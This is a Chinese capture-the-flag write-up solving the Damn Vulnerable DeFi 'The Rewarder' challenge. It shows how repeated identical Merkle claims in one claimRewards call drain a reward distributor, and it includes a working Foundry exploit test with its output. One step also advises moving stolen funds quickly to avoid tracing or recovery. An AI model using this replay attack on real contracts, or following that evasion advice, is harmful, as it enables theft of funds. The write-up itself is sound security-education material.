## 题目 [The Rewarder](https://github.com/theredguild/damn-vulnerable-defi/tree/v4.0.0/src/the-rewarder)
一个智能合约正在分发 Damn Valuable Tokens（DVT）和 WETH 作为奖励。要领取这些奖励，用户必须证明自己在受益人名单中。不过，不用担心 gas 费用。这个合约已经过优化，可以在同一个交易中领取多个代币的奖励。  
Alice 已经领取了她的奖励，你也可以领取！不过，你发现这个合约中存在一个关键漏洞。你的任务是尽可能多地从这个分发合约中挽救资金，并将所有追回的资产转移到指定的回收账户。

## 前置知识
### Merkle Proofs
Merkle Proofs 是密码学和区块链技术中的一个基础概念，用于验证特定数据块是否属于一个更大的数据集。  
1. 结构：Merkle 树是一种二叉树，其中每个叶子节点是一个数据块的哈希值，而每个非叶子节点是其两个子节点的哈希值。
2. 根哈希：Merkle 树的根哈希位于树顶，代表整个数据集的完整性。
3. Merkle 证明：是从特定叶子节点到根节点的哈希路径。它允许验证特定数据块是否属于整个数据集，而不需要拥有整个数据集。
4. 效率：Merkle 证明的大小相对于叶子节点的数量是对数级的，因此在处理大型数据集时非常高效。
5. 应用：Merkle 证明广泛应用于加密货币中，用于高效验证交易，也用于分布式系统中的数据完整性检查。

### Bitmaps
Bitmaps 是一种紧凑的数据结构，用于表示一组布尔值。位图可以高效地跟踪状态（例如，某个事件是否已经发生）。   
1. 结构：位图是一个比特数组，每个位代表一个布尔值。
2. 效率：位图非常节省空间，因为每个布尔值只占用一位内存。
3. 操作：常见的操作包括设置位、清除位、切换位以及检查位是否已设置。
4. 性能：位操作通常非常快速。在以太坊智能合约中，位图通常用 uint256 值表示和处理。EVM 针对 256 位操作进行了优化，这使得 uint256 成为高效位图操作的理想选择。

## 合约分析
TheRewarderDistributor 合约利用 Merkle proofs 和 Bitmaps 实现高效的代币分发和领取。它允许代币分发者使用 Merkle 树结构来证明某个地址有权领取特定数量的代币，同时利用位图来记录哪些领取请求已经被处理。  
**结构体：**   
``` solidity
struct Distribution {
    uint256 remaining;
    uint256 nextBatchNumber;
    mapping(uint256 batchNumber => bytes32 root) roots;
    mapping(address claimer => mapping(uint256 word => uint256 bits)) claims;
}
```
- `Distribution`：用于管理每种代币的分发状态，包括剩余代币数量、批次号、Merkle 树根，以及已领取状态。
  - remaining：当前剩余的可分发代币数量。
  - nextBatchNumber：下一批次的编号，用于管理批次的顺序。
  - roots：用于存储每个批次对应的 Merkle 树根。
  - claims：用于追踪每个地址在不同批次中的领取状态。claims[address][word] 表示某个地址在特定 256-bit 位图中的领取状态。

``` solidity
struct Claim {
    uint256 batchNumber;
    uint256 amount;
    uint256 tokenIndex;
    bytes32[] proof;
}
```
- `Claim`：用于在 `claimRewards` 函数中传递领取请求的信息，包括批次号、领取金额、代币索引和 Merkle 证明。

**核心函数：**  
- `createDistribution(IERC20 token, bytes32 newRoot, uint256 amount)`：用于创建新的代币分发批次。分发批次通过一个给定的 Merkle 根（newRoot）和分发的总代币数量（amount）来定义。
- `claimRewards(Claim[] memory inputClaims, IERC20[] memory inputTokens)`：允许用户在一次调用中领取多个代币奖励。用户需要提供多个 Claim 对象（包括批次号、领取金额、代币索引和 Merkle 证明）以及相应的代币列表。合约通过验证这些证明来确认用户的领取请求，并使用 _setClaimed 函数记录领取状态，最后将代币转账给用户。
- `_setClaimed(IERC20 token, uint256 amount, uint256 wordPosition, uint256 newBits)`：用于标记领取请求为已处理，并更新剩余的代币数量。它通过位运算来更新位图中的领取状态。

## 漏洞分析
该漏洞出现在 `claimRewards` 函数的实现中，当处理多个领取请求的时候，只会在最后一次循环中更新存储中的领取状态。如果在正常请求中，每个领取状态的改变存放在 `bitsSet` 中，在最后一起更新到存储中是可以的。但是当在单次交易中提交多个相同的领取请求时，该漏洞便会被利用。

## 题解
攻击者利用 `claimRewards` 函数，通过重复提交同一个有效的领取请求，从而获得多次奖励分配。  

攻击步骤：   
1. 找到有效的未领取奖励：首先需要找到一个与攻击者地址相关的、尚未领取的有效奖励。
2. 创建重复的领取请求数组：构建一个包含多个相同领取请求的数组，每个请求都引用相同的有效奖励。
3. 调用 claimRewards 函数：使用准备好的相同领取请求数组调用 claimRewards 函数。这会导致合约为每个请求分发奖励，但只在最后一次请求时才标记为已领取。
4. 立即转移资金：在成功利用漏洞并收到多次奖励后，攻击者应立即将这些资金提取或转移到一个单独的地址，以避免被追踪或资金被追回。

测试代码：  
``` solidity
function test_theRewarder() public checkSolvedByPlayer {
    console.log("playerAddr: ", player); // 0x44E97aF4418b7a17AABD8090bEA0A471a366305C
    uint256 PLAYER_DVT_CLAIM_AMOUNT = 11524763827831882;
    uint256 PLAYER_WETH_CLAIM_AMOUNT = 1171088749244340;

    bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
    bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");

    uint256 dvtTxCount = TOTAL_DVT_DISTRIBUTION_AMOUNT / PLAYER_DVT_CLAIM_AMOUNT;
    uint256 wethTxCount = TOTAL_WETH_DISTRIBUTION_AMOUNT / PLAYER_WETH_CLAIM_AMOUNT;
    uint256 totalTxCount = dvtTxCount + wethTxCount;

    IERC20[] memory tokensToClaim = new IERC20[](2);
    tokensToClaim[0] = IERC20(address(dvt));
    tokensToClaim[1] = IERC20(address(weth));

    Claim[] memory claims = new Claim[](totalTxCount);

    for (uint256 i = 0; i < totalTxCount; i++) {
        if (i < dvtTxCount) {
            claims[i] = Claim({
                batchNumber: 0,
                amount: PLAYER_DVT_CLAIM_AMOUNT,
                tokenIndex: 0,
                proof: merkle.getProof(dvtLeaves, 188) // player's address is at index 188
            });
        } else {
            claims[i] = Claim({
                batchNumber: 0,
                amount: PLAYER_WETH_CLAIM_AMOUNT,
                tokenIndex: 1,
                proof: merkle.getProof(wethLeaves, 188)
            });
        }
    }

    distributor.claimRewards({
        inputClaims: claims,
        inputTokens: tokensToClaim
    });

    dvt.transfer(recovery, dvt.balanceOf(player));
    weth.transfer(recovery, weth.balanceOf(player));
}
```
运行测试：  
```
forge test --mp test/the-rewarder/TheRewarder.t.sol -vv
```
运行结果：
```
Ran 2 tests for test/the-rewarder/TheRewarder.t.sol:TheRewarderChallenge
[PASS] test_assertInitialState() (gas: 61631)
[PASS] test_theRewarder() (gas: 1011600793)
Logs:
  playerAddr:  0x44E97aF4418b7a17AABD8090bEA0A471a366305C

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 2.66s (2.64s CPU time)
```




